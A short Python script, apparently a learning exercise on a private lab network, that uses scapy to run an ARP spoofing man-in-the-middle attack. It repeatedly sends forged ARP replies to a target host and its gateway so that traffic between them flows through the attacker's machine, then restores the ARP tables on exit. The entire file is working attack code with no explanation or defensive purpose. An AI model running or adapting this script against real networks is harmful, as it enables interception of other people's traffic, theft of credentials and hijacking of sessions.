#!/usr/bin/env python3

import scapy.all as scapy
import time

def get_mac(ip):
    #scapy.arping(ip)
    arp_request = scapy.ARP(pdst = ip)
    #print arp_request.summary()
    #scapy.ls(scapy.ARP())
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    #print broadcast.summary()
    #scapy.ls(scapy.Ether())
    ip_mac = broadcast/arp_request
    #print ip_mac.summary()
    #ip_mac.show()
    resp_list = scapy.srp(ip_mac , timeout = 1 , verbose = False)[0]
    #print resp_list.summary()
    #print (resp_list[0][1].hwsrc)
    return resp_list[0][1].hwsrc
    

def arp_spoof(target_ip , spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP( op = 2 , pdst = target_ip, hwdst = target_mac , psrc = spoof_ip)
    #print(packet.summary())
    #print(packet.show())
    scapy.send(packet , verbose = False)

def restore_arp(dest_ip , src_ip):
    dest_mac = get_mac(dest_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP( op = 2 , pdst = dest_ip , hwdst = dest_mac , psrc = src_ip , hwsrc = src_mac)
    scapy.send(packet , verbose = False , count = 4 )
packet_sent = 0
target_ip = "192.168.244.130"
gateway_ip = "192.168.244.2"
try:
    while True:
        #print("[+] packet sent" + str(packet_sent))
        arp_spoof(target_ip , gateway_ip)
        arp_spoof(gateway_ip , target_ip)
        packet_sent = packet_sent + 2
        print("\r[+] packet sent " + str(packet_sent), end = "")
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] ctrl + C     Restoring MAC")
    restore_arp(target_ip , gateway_ip)
    restore_arp(gateway_ip , target_ip)
